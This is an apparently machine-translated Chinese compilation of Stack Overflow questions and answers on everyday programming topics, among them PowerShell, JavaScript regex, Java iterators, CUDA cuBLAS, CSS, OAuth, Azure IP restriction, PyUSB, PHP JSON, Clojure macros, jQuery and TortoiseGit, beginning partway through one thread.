> 赞同：1
> 
> 时间：2013-03-27T07:24:35.493

我正在给@mjolinor 打勾，因为他提供了一段不错的代码以及他付出的努力。尽管如此，一些读者可能会对这种变化感兴趣，特别是我为格式灵活性提供的 NameWidth 和 NumberWidth 参数：

```
filter Select-StringAligned
{
    [CmdletBinding()]
    Param (
    [Parameter(Mandatory=$true,Position=0, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
    [string[]]$InputObject,

    [Parameter(Mandatory=$true,Position=1)]
    [string]$Pattern,
    [int[]]$Context = @(0),
    [int]$NameWidth = 35,
    [int]$NumberWidth = 4)

    select-string -Path $InputObject -Pattern $pattern -Context $Context |
    % {
        $entry = $_            

        if ($Context[0] -eq 0) { $offset = 0 }
        else { $offset = @($entry.Context.PreContext).Count }
        $linenum = $entry.LineNumber - $offset - 1

        # For some reason need to special case the $list construction; otherwise acts like Context=(1,1)
        if ($Context[0] + $Context[1] -eq 0) {
            $list = $entry.Line
        }
        else {
            $list =  @($entry.Context.PreContext)
            $list += $entry.Line
            $list += $entry.Context.PostContext
        }
        $list | % { 
            if ($entry.FileName.length -lt $nameWidth) { $truncatedName = $entry.FileName }
            else { $truncatedName=$entry.FileName.SubString(0,$NameWidth) }
            "{0,-$NameWidth}:{1,$NumberWidth}: {2}" -f $truncatedName, $linenum++, $_
        }
    }
} 
```

这是一个示例用法。-NameWidth 参数允许字段宽度小于（截断）或大于（填充）文件名。

```
$pattern = "public"
Get-ChildItem *.cs |
Select-StringAligned -pattern $pattern -Context 0,2 -NameWidth 20 -NumberWidth 3 
```

# javascript - 使用 .match 的正则表达式数组

> ID：15443280
> 
> 赞同：0
> 
> 时间：2013-03-15T22:44:43.290
> 
> 标签：javascript, jquery

我有一些我想要完成的事情。

我想采用一个用 AJAX/ 构建的数组`xml`。

```
array[/word0/, /word1/, /word2/] 
```

并将其放入可用于 a 的形式中`.match()`：

```
result = string.match(array) 
```

我尝试使用 for 循环并单步执行数组`string.match(array[i])`，但无济于事。

是否有捷径可寻？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T22:49:27.777

[http://jsfiddle.net/KALPh/](http://jsfiddle.net/KALPh/)

你的方法很好。这是我的实现：

```
var regexes = [/^def/, /^abc/],
    testString = 'abcdef',
    numRegexes = regexes.length;

for(var x=0;x<numRegexes;x++) {
    alert(regexes[x].test(testString));
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-15T22:49:29.710

**编辑：**您可能有语法问题。以下是无效的语法：

```
array[/word0/, /word1/, /word2/] 
```

像这样的东西修复它：

```
var regexps = [/word0/, /word1/, /word2/]; 
```

* * *

**原答案：**

Javascript`RegExp`已经这样做了。您正在寻找：

```
var regexp = /word0|word1|word2/; 
```

假设您的匹配列表以正确的格式返回，您可以这样实现：

```
var words = ["word0", "word1", "word2"];
var regexp = new Regexp(words.join("|"));
str.match(regexp); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-15T22:47:43.883

要初始化您的数组，请使用

```
var array = [/word0/, /word1/, /word2/]; 
```

然后你可以使用

```
str.match(array[i]) 
```

如果您的问题是“AJAX/xml”中的传输，那么您需要构建正则表达式客户端`new RegExp(somestring)`，`somestring`例如可能是`"word0"`：您不能在 XML 中嵌入正则表达式**文字。**

# java - Java：元组上的“迭代器”

> ID：15443281
> 
> 赞同：1
> 
> 时间：2013-03-15T22:44:42.793
> 
> 标签：java, iterator, inner-classes

我有一个学生类，它有一个`bigTable`类型的成员`ArrayList<ArrayList<Integer>>`。如果我们把它想象成一个矩阵，我希望能够迭代一个特定的列，在一些迭代器初始化中作为参数给出。另外，我希望迭代器有 2 个方法，`getValue`并且`getPosition`. 即类似的东西：

1 2 3
9 8 6
3 4 5

```
Student student = newStudent()
SomeType(what??) it = student.iterator(1);
it.getValue() // returns 2
it.getPosition() // returns 0
it.next() // moves to next position
it.getValue() // returns 8
it.getPosition() // returns 1
... 
```

这个界面只是一个建议。我正在考虑通过内部类在 Student 中实现迭代器模式。但是返回对内部类的引用是否合适？事实上，如果我想将迭代器作为参数传递给某人，我应该说它是什么类型？（内部类不可见）...

有没有更优雅的方式来完成这项任务？

另外，只是想知道，如果我返回整行（一个 ArrayList，在这种情况下 Student 可以实现 Iterator 接口）会占用额外的内存（我的意思是它会被复制还是只是传递一个引用？）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T23:16:58.737

返回内部类的实例是提供的一种常见方式`Iterator`- 请参阅`java.util`源代码以获取许多示例。

我认为偏离正常`Iterator`界面会造成不必要的混乱，特别是如果您调用返回它的方法“迭代器”。

如果您希望`iterator()`结果让您使用`getValue()`和`getPosition()`方法获得某些东西，请声明带有这些方法的接口。我会这样称呼它`ElementData`——你可以为你的情况想一个更有意义的名字。然后您的`iterator()`方法可以返回`Iterator<ElementData>`.

您的代码将变为：

```
Student student = newStudent()
Iterator<ElementData> it = student.iterator(1);
ElementData element;
element = it.next()
element.getValue() // returns 2
element.getPosition() // returns 0
element = it.next() // moves to next position
element.getValue() // returns 8
element.getPosition() // returns 1 
```

# cuda - 如何使用 cublas 库

> ID：15443285
> 
> 赞同：2
> 
> 时间：2013-03-15T22:45:03.323
> 
> 标签：cuda, cublas

我是cuda的新手。我想在 cuda 程序中使用 cublas 功能，并想知道如何使用它的过程。当我尝试在 GPU 上运行它时，我的程序给出了错误，即 *"cublas_v2.h 文件不存在"*。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-15T22:57:17.670

1.  cublas 文档包含 [在此处](http://docs.nvidia.com/cuda/cublas/index.html)。所以你应该熟悉它。
2.  尝试运行示例程序。CUDA 5 工具包附带的 CUDA 示例中有示例，或者您可以在[此处](http://docs.nvidia.com/cuda/cublas/index.html#topic_2_3)尝试。确保您了解如何构建和运行该示例。
3.  如果您仍然对自己的程序有问题，请在此处发布一个新问题并附上详细信息。例如，如果您的程序正在提供错误输出，请粘贴您获得的完整错误输出，并粘贴您的程序中生成该错误输出的代码（至少）。最好粘贴到您的整个程序中，或者粘贴到会重现错误的简单版本中。

您现在遇到的错误看起来应该来自*编译器*，而不是来自您运行程序时。如果是这样，您只需要告诉编译器在哪里可以找到该头文件。如果您查看像[这样](http://docs.nvidia.com/cuda/cuda-samples/index.html#simple-cublas)的 cuda 示例，您可以从包含的 makefile 中看到如何告诉编译器在哪里查找头文件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-09-21T08:05:39.173

可能有多种情况，因此您必须努力运行使用 CuBlas 库的代码。

1.  最重要的是使用**-lcublas**标志编译源代码。它应该看起来像**nvcc -c example.cu -o example -lcublas**
2.  其次，确认您的系统中是否有 Cublas Library。正如它所说的“cublas_v2.h 文件不存在”，尝试执行“whereis cublas_v2.h”或手动搜索该文件，如果它不存在，则需要
    从 Nvidia 的网站安装 Cublas 库。
3.  确认你的 Cuda 安装路径和 LD_LIBRARY_PATH 你的 cuda 路径应该是 /usr/local/cuda。并且 LD_LIBRARY_PATH 应该是 /usr/local/cuda/lib64**或** /usr/local/cuda/lib。

# html - CSS id 不起作用

> ID：15443298
> 
> 赞同：0
> 
> 时间：2013-03-15T22:46:31.653
> 
> 标签：html, css

我看不出这有什么问题。我有 2 个 HTML 工作表和一个 CSS 工作表。

第一个 HTML 表单 ( `index.html`) 是这样的：

```
<html>
<head>
    <link rel="stylesheet" type="text/css" href="style.css">
    <link href='http://fonts.googleapis.com/css?family=Cedarville+Cursive' rel='stylesheet' type='text/css'>
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
    <script type="text/javascript" src="script.js"></script>
</head>

<body>

    <h1>Olive</h1>
    <a href="page1.html">Enter</a>

</body>
</html> 
```

第二个 HTML 表 ( `page1.html`) 是这样的：

```
<!DOCTYPE>
<html>

<head>
    <link rel="stylesheet" type="text/css" href="style.css">
    <link href='http://fonts.googleapis.com/css?family=Cedarville+Cursive' rel='stylesheet' type='text/css'>
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
    <script type="text/javascript" src="script.js"></script>
</head>

<body>
    <div>
        <p id="prenav">Olive</p>
    </div>
</body>

</html> 
```

和 CSS 外部表：

```
body {
background-color: olive;
}

h1 {
font-family: 'Cedarville Cursive', cursive;
font-size: 230px;
text-align: center;
padding: 0px;
}

a {
display: block;
text-align: center;
font-family: 'Cedarville Cursive', cursive;
color: white;
font-size: 100px;
padding: 0px;
text-decoration: none;
}

#prenav {
font-family: 'Cedarville Cursive', cursive;
font-size: 50px;
color: white;
} 
```

问题是`id`第二个 HTML 表 ( `page1.html`) 中的那个不起作用。我不知道为什么。我不知道是语法还是什么。

body 属性在 中起作用`page1.html`，但`id`属性不起作用。该`<p>`元素仅以任何样式出现。有人可以告诉我这有什么问题吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-15T22:51:31.590

不确定这是否是问题，但您的第一行应该是：

```
<!DOCTYPE html> 
```

如果您没有正确声明它，您的浏览器可能会以[怪异模式](http://en.wikipedia.org/wiki/Quirks_mode)呈现，这可能会导致各种奇怪的行为。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-15T23:08:48.230

调试的一些技巧...尝试在修改 css 样式（使用 chrome 和 windows: ）时多次刷新缓存，`ctrl+shift+r`然后如果它不起作用，请尝试使用下面的代码并再次刷新缓存：

```
#prenav {
font-family: 'Cedarville Cursive', cursive !important;
font-size: 50px !important;
color: white !important;
} 
```

该`!important`规则是一种使您的 CSS 级联的方法，但也有您认为最重要的规则始终被应用。

代码：

```
<!DOCTYPE html>
<html>

<head>
    <link href='http://fonts.googleapis.com/css?family=Cedarville+Cursive' rel='stylesheet' type='text/css'>
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
    <style type="text/css">
        body {
background-color: olive;
}

h1 {
font-family: 'Cedarville Cursive', cursive;
font-size: 230px;
text-align: center;
padding: 0px;
}

a {
display: block;
text-align: center;
font-family: 'Cedarville Cursive', cursive;
color: white;
font-size: 100px;
padding: 0px;
text-decoration: none;
}

#prenav {
font-family: 'Cedarville Cursive', cursive;
font-size: 50px;
color: white;
}

</style>
</head>

<body>
    <div>
        <p id="prenav">Olive</p>
    </div>
</body>

</html> 
```

编辑：

解决方案是将 .css 样式表放到正确的文件夹中。干杯。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-15T22:55:47.997

语法是正确的，但脚本可能是任何更改此 id 样式的命令。

# api - 后端 REST API 中的 OpenID

> ID：15443299
> 
> 赞同：0
> 
> 时间：2013-03-15T22:46:31.647
> 
> 标签：api, rest, openid

我们正在为将 OpenID 作为身份验证选项的应用程序设计 Web 服务。问题来了，我们以后如何为这个用户启用 API 访问？

为了清楚起见，这里是一个例子：

1) 用户 A 访问该站点并使用 Yahoo（或其他）OpenID 进行注册 2) 稍后我们希望启用 API 访问代表该用户行事的后端同步应用程序。3) 出于安全原因，不能为应用提供可以访问所有帐户的密钥

使用这种模式的例子有哪些？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-17T01:43:48.330

标准 OpenID 需要浏览器，因为它依赖于能够从外部站点加载页面来完成登录过程。因此它不适合服务器到服务器 API 的使用。

[使用OAuth](https://oauth.net/)作为服务器到服务器 API 的身份验证机制更为常见。虽然标准 OAuth 还需要浏览器和用户交互流来授予对新应用程序的访问权限，但它会生成一个令牌，然后应用程序可以使用该令牌代表用户处理用户无人参与的请求。

Facebook 可能是 API 的 OAuth 2 最知名的用户，它的[登录架构](https://developers.facebook.com/docs/concepts/login/login-architecture/)文档描述了他们在高级别支持的各种登录流程。名为“服务器端登录”的一种是传统的 OAuth 流程，而另一些则是支持不同用例的不同方法，例如移动应用程序登录和从嵌入在其他站点的客户端 JavaScript 访问。

# javascript - 用于为 ajax 请求序列化 javascript 对象的递归函数 - 有没有更简单的方法？

> ID：15443303
> 
> 赞同：2
> 
> 时间：2013-03-15T22:47:11.300
> 
> 标签：javascript, ajax, json, serialization

这是我编写的一个函数和助手，用于序列化 javascript 对象以在 ajax 请求中发送。有可能在某个地方有更有效的解决方案，可能在 jQuery 库中，但我找不到。不是一个 javascript 对象。

```
/*
@author Benjamin Yep
@important - THIS FUNCTION ASSUMES INPUT ENCODED ACCORDING RFC 3986 see here: https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/encodeURIComponent
@param data - Any javascript object or array.
@param pName - The name of the object to be sent in your ajax request.
@return A serialized JSON-encoded object, ready to send in a request.
Usage:
var someObject={
"foo":"bar",
"bars":["foo","bar"],
"object":{
    "foo":1,
    "bar":2",
},
};
var r=makeHttpObject();//new ajax object
r.open("get","example.php",false);
r.send(paramify(someObject,"varname"));
//In example.php
<?php
echo var_dump($_POST['varname']);
?>
//back in the javascript file
console.log(r.responseText);//shows the contents of the object you sent to the server
*/
function paramify(data,pName){
return constructObject(data,pName).substr(1);
}
function constructObject(data,path){
var contents="";
for(var key in data){
    var curpath=path+"["+key+"]";
    if(Object.prototype.toString.call(data[key])==='[object Object]'||data[key] instanceof Array){
        if(!(data[key] instanceof Array)||data[key].length!=0){
            if(JSON.stringify(data[key])=="{}"){
                contents+="&"+curpath+"={}";
            }else{
                contents+=constructObject(data[key],curpath);
            }
        }else{
            contents+="&"+curpath+"=[]";
        }
    }
    else{
        contents+="&"+curpath+"="+data[key];
    }
}
return contents;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T23:15:48.213

就效率而言，您可以对这种功能进行很多改进。

但是，您应该能够在函数中以相同的方式处理对象和数组。循环将`for...in`与数字键一起正常工作。

另外，请确保您对进入输出的所有内容进行编码`encodeURIComponent()`

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-03-15T22:55:39.887

请看这个插件

[jQuery json](https://code.google.com/p/jquery-json/)

> 这个插件在（根）jQuery 对象上公开了四个新方法：
> 
> toJSON：将 javascript 对象、数字、字符串或数组序列化为 JSON。
> 
> evalJSON：从 JSON 转换为 Javascript，快速且简单。
> 
> secureEvalJSON：从 JSON 转换为 Javascript，但在检查源是否实际上是 JSON 时这样做，而不是与其他 Javascript 语句一起抛出。
> 
> quoteString：在字符串周围放置引号，并智能地转义任何引号、反斜杠或控制字符。

# java - 带有文件 i/o 和数组列表的 JTable

> ID：15443304
> 
> 赞同：0
> 
> 时间：2013-03-15T22:47:10.983
> 
> 标签：java, swing, file-io, arraylist, jtable

在我的程序中，用户输入单词及其相应的定义。此用户定义对象的一个​​示例是 [面部，人脸]。用户的话存储在与文件 i/o 一起使用的数组列表中。但是，每次我调用“prepareTable”方法时，程序都会将在文本文件中找到的单词的重复项添加到数组列表中。如果您需要查看更多代码，我可以发布它，但为了方便/可读性，我只发布了 prepareTable 方法。为什么我的程序会重复单词？这种方法有问题吗？

```
public void prepareTable ()
{
    readFromFile();
    for (int i = 0; i <= LibraryWordsList.size() - 1; i++)
    {
       tableData.setValueAt(LibraryWordsList.get(i).getWord(), i, 0);
       tableData.setValueAt(LibraryWordsList.get(i).getDefinition(), i, 1);  
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-16T02:09:51.817

如果`tableData`引用 的实例`DefaultTableModel`，您可以调用`setRowCount(0)`以在添加新条目之前清除以前的条目。您可以`TableModel`使用 table's`getModel()`方法获取对 table 的引用。

# javascript - 固定 div 右侧的悬停菜单

> ID：15443306
> 
> 赞同：0
> 
> 时间：2013-03-15T22:47:14.383
> 
> 标签：javascript, jquery, menu, css-position

我有一个固定位置（顶部面板）的 div，它还应在最右侧包含一个设置菜单（当前通过浮动）。

将鼠标悬停在设置图像上时，我想在图像下方显示一个菜单。我希望菜单像图像一样与右侧对齐。

```
<div id="panel" style="position:fixed">
  <panel-entry 1>
  <panel-entry 2>
  <panel-entry n>

  <div id="settings" style="float:right/snapped to the right side>
    <img src=settings>
    <ul>
      <li>setting 1</li>
      <li>setting 2</li>
      <li>setting n</li>
    </ul>
  </div>
</div> 
```

非常感谢任何使用 jQuery 的想法，请随时重新排列任何 html。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T22:50:05.590

不需要 jQuery，只需给你`#panel`一个宽度：

```
#panel {
  position: fixed;
  width: 100%;
}
#settings {
  float: right;
} 
```

见[演示](http://jsfiddle.net/uVp45/6/)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-15T23:34:15.040

除了您的示例**不是 HTML**之外，我无论如何都会纠正概念方法。这样的任务不需要 jQuery，可以完全在 CSS 中完成。

1.  你希望你`#panel`首先包含一个`<ul>`将包含`<li>`s，这将是你的`<panel-entry>`，那些应该设置为`inline-block`。

2.  应该是其中`#settings`之一，可能带有特殊的`class`或`id`（我们现在将保留设置）。你可以`position: absolute`这样来`right: 0`，或者拥有它`float`。不要为此使用图像元素，而是使用`background-image`.

3.  在此元素内，您将有一个子菜单：即另一个`<ul>`带有`display: none`、 a和的子菜单`position:absolute`，因此 X 不会与您的.`right: 0``top: X``#panel`

4.  接下来，您要使元素在`:hover`of上可见`li#settings`。

`[**Here's a working demo**](http://jsbin.com/uwagoh/3)`

## 基本 HTML

```
<div id="panel">
  <ul>
      <li>Panel entry 1</li>
      <li>Panel entry 2</li>
      <li>Panel entry n</li>
      <li id="settings">

        <ul>
          <li>setting 1</li>
          <li>setting 2</li>
          <li>setting n</li>
        </ul>

      </li>
  </ul>
</div> 
```

## 基本 CSS

```
#panel {
  position: fixed;
  top: 0;
  width: 100%;
}

#panel > ul > li {
  display: inline-block;
}

#panel > ul > li > ul {
  display: none;
  position: absolute;
  top: {X};
  right: 0;
}

li#settings {

  background: url({youricon}) no-repeat top center;
  position: absolute;
  right: 0;
  min-width: {youricon-x};
  min-height: {youricon-y};
}

li#settings:hover > ul{

  display: block;

} 
```

# azure - 将 Azure 暂存应用程序限制为选定的 IP

> ID：15443308
> 
> 赞同：0
> 
> 时间：2013-03-15T22:47:19.313
> 
> 标签：azure, ip, azure-web-roles, staging

我正在给定 Web 角色的暂存槽中测试应用程序。我不希望公众可以访问暂存应用程序，我想知道是否可以在 .cscfg 文件中添加任何内容以将应用程序锁定为一组已知 IP？我环顾了门户网站，但看不到任何限制 IP 的方法。

对此有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-16T02:29:30.050

您可以启用内置的 IIS IP 和域限制，然后在 web.config 中提供 IP 列表（遗憾的是，如果您必须修改它们，这将意味着重新部署）。这是一个博客文章的链接，有人这样做：[http ://blog.liamcavanagh.com/2011/10/how-to-block-ip-addresses-in-windows-azure/](http://blog.liamcavanagh.com/2011/10/how-to-block-ip-addresses-in-windows-azure/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-15T23:06:38.577

我从来没有听说过。

在您的 global.asax 中：

```
 protected void Session_Start()
        {
            if (Request.ServerVariables["REMOTE_ADDR"]!= "ÿour ip address here")
            {
                 Response.StatusCode = 404;
            }
        } 
```

# python - 询问数字或字母时如何获得有效答案

> ID：15443312
> 
> 赞同：1
> 
> 时间：2013-03-15T22:47:37.223
> 
> 标签：python, python-3.x

```
def main ():
    input('press enter to begin testing...')

    counter = 0
    total = 0;

    value = int( input ("Enter temp:  or q to quit " ))

    maxval = value
    minval = value

    while value:
        counter += 1
        total += value

        if value > maxval:
            maxval = value
        if value < minval:
            minval = value

        value = int( input ("Enter temp:  or q to quit "))

    print ( 'Total is:  ', total)
    print ('Counter is: ', counter)

    if counter != 0:
        print ('Average is: ', total / counter)
        print ('Minimum is:  ', minval)
        print ('Maximum is:   ', maxval) 
```

问题是当要求一个`temp`或`q`退出时，因为它是一个 int`q`不被接受，因为它是一个 str。

我尝试提出单独的问题，但它没有正确计算循环。然后我尝试`ord ('q')`了哪个是`113`. 我不确定如何使它成功应用，或者是否有更好的方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T22:49:49.940

与其将值直接转换为`int`，不如先检查其内容：

```
value = input ("Enter temp:  or q to quit ")
if value == 'q':
    return

value = int(value) 
```

# qstring - QString 删除与字母无关的数字

> ID：15443315
> 
> 赞同：0
> 
> 时间：2013-03-15T22:48:13.100
> 
> 标签：qstring

我正在寻找一种方法来删除括号中的所有数字和字母，以及与字母无关的数字（即我想保留`'v2'`或`'vol.2'`）。

例如：

```
"My Notes v02 003 (2009) (My sillyness)" 
```

会成为：

```
"My Notes v02". 
```

我找到了删除大括号中的数据和大括号本身的方法，但是我现在遇到的问题是删除与卷标识符无关的数字。

目前我有：

```
QString myItem = "My Notes v02 003 (2009) (My sillyness)";
myItem = myItem.remove( QRegExp( "\\[.*\\]|\\(.*\\)" ) ); 
```

我是否需要将字符串分解为单个单词并手动检查？还是有更好的解决方案？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-03-13T21:15:16.027

首先，我想建议您使用 boost 库轻松地操作您的字符串数据 [http://www.boost.org/](http://www.boost.org/) 所以如果您的 QString myItem 始终是结构数据，那么每次使用拆分字符串很容易得到您想要的找空白

```
#include <boost/algorithm/string.hpp>
using namespace std;
using namespace boost;
/..
QString myItem = "My Notes v02 003 (2009) (My sillyness)";
vector< string > newItem;
split( newItem, myItem.tostdstring, is_any_of(" "));
cout <<newItem.at(0) <<" "<<newItem.at(1) <<" "<<newItem.at(2) <<endl; 
```

# python - PyUSB 库使用过多的 CPU 时间

> ID：15443318
> 
> 赞同：1
> 
> 时间：2013-03-15T22:48:35.370
> 
> 标签：python, libusb, pyusb

我有一段代码可以持续监控 USB HID 设备的输入。该设备是用于遥控器的红外接收器。

我正在尝试使用**PyUSB**进行编程，它是**libusb**的 python 包装器来监控远程按键。

为了持续监控设备的输入，我添加了以下代码行

```
while 1:
    try:
        data = dev.read(ep.bEndpointAddress, ep.wMaxPacketSize*2)
        data=data.tolist()           
        key=join_int(data)                              #Join the elements of list
        print "Key is " , key
    except usb.core.USBError as e:
        pass 
```

该代码在使用**top**检查时会占用大量 CPU 时间。

有没有办法减少 CPU 使用率。添加 sleep() 是一种方法，但如果我没记错的话，可能会错过击键。

# php - 在 for 循环中嵌套 json 对象

> ID：15443319
> 
> 赞同：2
> 
> 时间：2013-03-15T22:48:37.143
> 
> 标签：php, javascript, jquery, json

我有一个 for 循环，它返回一个 id 和用户拥有的所有图像的名称。

```
 $from1 = 1;
 $from2 = 10;

 for ($i=$from1; $i < $from2; $i++) {
     if (($i % 5) == 0) 
     $idTemp = $id1[$i];

     echo $idTemp;
     echo $name[$i];
 } 
```

我不想回显数据，而是希望将其放入 json 响应中，如下所示：

```
"images":[
    "1":{"id":"1234","name":"thisisaname"},
    "2":{"id":"4332","name":"namename"}
] 
```

但我似乎无法弄清楚如何在循环中创建 json 数组。另外我将如何循环解码json？

任何人都可以帮忙吗？提前为任何帮助干杯，杰米

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-15T22:56:23.693

在服务器端 (PHP) 打印 json 响应，首先创建具有相同结构的 php 数组，然后您可以使用以下代码对其进行编码`json_encode`：

```
$from1 = 1;
$from2 = 10;

$json = array('images' => array());
for ($i=$from1; $i < $from2; $i++) {
    if (($i % 5) == 0) {
        $json['images'][$i] = array(
            'id' => $id1[$i],
            'name' => $name[$i]
        );
     }
}

echo json_encode($json); 
```

在客户端（JS）你会收到一个`data`对象：

```
$.getJSON(url, function(data) {
    for (x in data.images) {
        data.images[x].id;
        data.images[x].name;
    }
} 
```

# clojure - Clojure — `->` 宏中的部分内容

> ID：15443320
> 
> 赞同：8
> 
> 时间：2013-03-15T22:48:39.267
> 
> 标签：clojure

我刚刚开始使用 Clojure，我想知道为什么以下内容不能按预期工作：

```
(-> 5
    -
    (partial + 5)) 
```

我希望这个表达式的结果是 0 (-5 + 5)，但整个事情似乎是部分的。

```
(macroexpand `(-> 5 - (partial + 5))
  #_=> )
(clojure.core/partial (clojure.core/-> 5 clojure.core/-) clojure.core/+ 5) 
```

为什么会这样，我该怎么做？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-15T22:59:04.940

需要一组额外的括号：

```
user> (-> 5 - ((partial + 5)))                                                                                                                                            
0 
```

宏将前一个表达式的`->`结果作为列表中的第二个参数插入，因此在您的示例中，它将扩展为`(partial (- 5) + 5)`在部分函数之后插入的额外 ()`((partial + 5) (- 5))`

# facebook - 如何从 Facebook 的位置 IDS 获取 lat/lng

> ID：15443341
> 
> 赞同：0
> 
> 时间：2013-03-15T22:50:16.130
> 
> 标签：facebook, facebook-graph-api, facebook-checkins

我有一个 Android/Web 应用程序，用户通过 FBConnect 登录，现在我有位置 ID 如何将这些位置 ID 转换为 lat/lng ？

例如：这些是带有国家和/或城市名称的示例位置 ID：

```
{"id":"110647272290207", "name":"Mohammedia,  Morocco"}

{"id":"111612325521963", "name":"Doha, Qatar"}

{"id":"116190411724975", "name":"Melbourne,  Victoria,  Australia"} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-15T22:54:21.370

我刚刚找到了解决方案：在这里，它甚至不需要访问令牌：

```
http://graph.facebook.com/[location_id] 
```

例如：

```
http://graph.facebook.com/116190411724975 
```

# jquery - jquery删除逗号并递增1？

> ID：15443346
> 
> 赞同：1
> 
> 时间：2013-03-15T22:51:18.067
> 
> 标签：jquery

我有一个 span 元素，其中包含一个数字，例如`1,568`.

单击按钮时，我需要该数字增加 1。所以`1,568`变成`1,569`.

如果我只是获取值并添加`+ 1`到它，则值变为`2`：

```
("#artist-fan-count").text(parseInt($("#artist-fan-count").text()) + 1); 
```

我应该尝试删除逗号然后运行上面的代码吗？如果我做下面的那行，什么都不会发生——这让我相信我做错了。耸耸肩。

```
$("#artist-fan-count").text().replace(',', ''); 
```

有小费吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-15T22:53:13.027

尝试以下操作以删除逗号并增加 1：

```
var fanCountEl = document.getElementById('artist-fan-count');
fanCountEl.innerHTML = parseInt(fanCountEl.innerHTML.replace(',', '')) + 1; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-15T22:59:45.543

您可以删除所有逗号、parseInt、increment，然后用逗号重新构建您的数字，如下所示：

```
var $e = $("#artist-fan-count");
var num = parseInt($e.text().replace(',','')) + 1;
$e.text($.fn.digits(num)); 
```

使用来自 [的数字：每三位数字添加逗号](https://stackoverflow.com/questions/1990512/add-comma-to-numbers-every-three-digits-using-jquery)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-15T22:55:37.893

好吧，您必须将替换的文本写回：

```
$("#artist-fan-count").text($("#artist-fan-count").text().replace(',', '')); 
```

之后，您可以将文本解析为整数，添加您的数字并（如果您愿意）将该逗号放回原处。

如果你想重新组合你的文本：

```
var number = $("#artist-fan-count").text();
$("#artist-fan-count").text(parseInt(number/1000)+","+(number%1000)); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-15T22:53:51.693

你可以这样做：

```
var $e = $("#artist-fan-count");
var str = ''+(parseInt($e.text().replace(/,/g,''), 10)+1);
var r = /(\d+)(\d{3})/;
while (r.test(str))  str = str.replace(r, '$1' + ',' + '$2');
$e.text(str); 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-03-15T22:55:08.520

你已经接近了，但 replace 并没有就地完成：

```
$("#artist-fan-count").text($("#artist-fan-count").text().replace(',', '')); 
```

# git - TortoiseGit 自动登录

> ID：15443357
> 
> 赞同：1
> 
> 时间：2013-03-15T22:52:00.003
> 
> 标签：git, tortoisegit

昨天，我设置了我的 TortoiseGit，目前它做得非常好。

只有一件事困扰着我，每当我提交并想要推送时，我必须输入我的用户名和密码。有没有办法让 TortoiseGit 自动登录？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T23:01:09.817

是的，您可以使用[选美](http://www.chiark.greenend.org.uk/~sgtatham/putty/download.html)并加载您的 SSH 密钥。选美包含在腻子安装程序中或作为单个程序。

# jquery - 如何将所有外部链接重定向到我的主页

> ID：15443358
> 
> 赞同：1
> 
> 时间：2013-03-15T22:52:00.897
> 
> 标签：jquery, html, http

我正在解决这个问题，但无法找到解决方案。我浪费了太多时间来寻找解决方案，但仍然没有结果。我想将所有外部链接重定向到我的主页，当然只有外部链接，而不是内部链接。在浪费了太多时间之后，我只是做了这个，但它对我不起作用。

```
$('a[href^="http://www.kownleg.com"]').attr('rel','nofollow'); 
```

如果将来（停止所有外部链接后）我需要放置外部链接，我应该怎么做。

* * *

## 详细改进我的问题

我的意思是，我的网站链接是 www.kownleg.com，我想重定向所有链接，如果将来我在我的网站上分享 www.facebook.com 链接，如下所示，那么当有人在链接上链接时，它将被重定向到我的主页，即 Kownleg.com。如果我共享我网站的扩展页面，那么它将重定向到该页面。就像我分享 www.kownleg.com/whatever 一样，它会重定向到这个页面，因为它的内部链接。如果我分享 facebook.com，那么它将重定向到我的主页，因为它的外部链接。这就是我想要的。

```
<a href='Whatever External Link is' target='_blank'>Anything</a> 
```

我在这个话题上搜索了很长时间，任何与这个话题相似的帮助或材料都是非常可观的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-16T00:12:11.397

因此，为了改写您的问题，您似乎是在说要检查页面上的所有链接，并且任何“外部”（定义为*不*包含`www.kownleg.com`）的链接都将被更改，以便它们转到`www.kownleg.com`?

如果是这样，这并不是一件很复杂的事情，尤其是使用 jQuery（尽管您也可以使用纯 JS 轻松完成）：

```
// when the document is ready
$(document).ready(function() {
    // iterate over all the anchor tags
    $("a").each(function() {
        // if the current link's href doesn't already contain 'www.kownleg.com'
        if (this.href.indexOf('www.kownleg.com') === -1) {
            // change current link to home page
            this.href = 'http://www.kownleg.com';
        }
    });
}); 
```

> *“如果将来我在我的网站上分享`www.facebook.com`链接，如下所示，那么当有人在链接上链接时，它将被重定向到我的主页”*

